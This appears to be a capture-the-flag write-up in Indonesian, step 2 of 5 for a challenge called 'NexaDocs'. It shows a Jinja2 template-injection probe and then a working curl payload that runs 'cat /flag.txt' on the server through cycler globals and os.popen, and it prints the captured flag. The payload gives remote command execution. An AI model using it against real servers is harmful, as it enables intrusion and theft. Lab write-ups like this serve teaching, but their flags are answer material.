# NexaDocs — Cara mendapatkan flag

[← Overview](79-nexadocs.md) · [Index](index.md)

> **Langkah 2/5.** SSTI Jinja2: `{{7*7}}` menjadi 49, lalu `os.popen` membaca `/flag.txt`.
>
> **Berikutnya:** [Flag](79-nexadocs-03-flag.md)

1. Bukti template dievaluasi:

```bash
curl -sS -b cookies -H 'ngrok-skip-browser-warning: 1' \
  --data-urlencode 'company_name={{7*7}}' \
  --data-urlencode 'footer_note=x' \
  "$HOST/studio" | grep 49
```

Output mengandung `49`.

2. Baca flag lewat global Jinja:

```bash
curl -sS -b cookies -H 'ngrok-skip-browser-warning: 1' \
  --data-urlencode 'company_name={{ cycler.__init__.__globals__.os.popen("cat /flag.txt").read() }}' \
  --data-urlencode 'footer_note=x' \
  "$HOST/studio" | grep NFX
```

```text
NFX{j1nja2_sstI_rce_v1a_gl0bals}
```

### Evidence langkah ini

![00b-terminal-evidence.png](assets/nexadocs/00b-terminal-evidence.png)

*Terminal evidence (arsip/log asli) — `00b-terminal-evidence.png`.*

**Berkas mentah terkait:**

- [`01-solve.txt`](assets/nexadocs/01-solve.txt)
